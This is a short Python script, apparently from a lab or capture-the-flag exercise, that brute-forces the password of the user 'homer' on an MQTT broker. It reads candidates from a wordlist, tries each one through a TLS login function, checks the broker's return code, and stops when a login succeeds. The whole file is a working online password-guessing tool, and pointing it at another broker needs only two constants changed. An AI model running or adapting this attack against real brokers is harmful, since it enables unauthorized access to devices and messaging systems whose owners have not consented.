import ssl
import time
import paho.mqtt.client as mqtt

BROKER_HOST = "localhost"
BROKER_PORT = 8883
CA_CERT = "certs/ca.crt"


def login(username, password):
    """
    Attempt to login to the MQTT broker with given username and password.
    Returns True on success, False otherwise.
    """
    result = {"rc": None}

    def on_connect(client, userdata, flags, rc):
        result["rc"] = rc

    client = mqtt.Client()
    client.username_pw_set(username, password)

    client.tls_set(
        ca_certs=CA_CERT,
        tls_version=ssl.PROTOCOL_TLS_CLIENT
    )

    client.on_connect = on_connect

    # Only checks TCP/TLS layer (not auth)
    if client.connect(BROKER_HOST, BROKER_PORT) != 0:
        return False

    client.loop_start()

    # wait up to 2 seconds for broker rc
    for _ in range(20):
        if result["rc"] is not None:
            break
        time.sleep(0.1)

    client.loop_stop()
    client.disconnect()

    # MQTT broker rc:
    #   0 = success
    #   4 = bad username/password
    #   5 = not authorized
    return result["rc"] == 0


if __name__ == "__main__":
    ## Read wordlist lin by line and call login with each line as password
    with open("wordlist.txt", "r", encoding="utf-8") as file:
        for line in file:
            password = line.strip()
            print(f"[INFO] Trying: {password}")

            success = login("homer", password)
            if success:
                print(f"[INFO] Successful login with password: {password}")
                break
            else:
                print(f"[INFO] Failed login with password: {password}")
            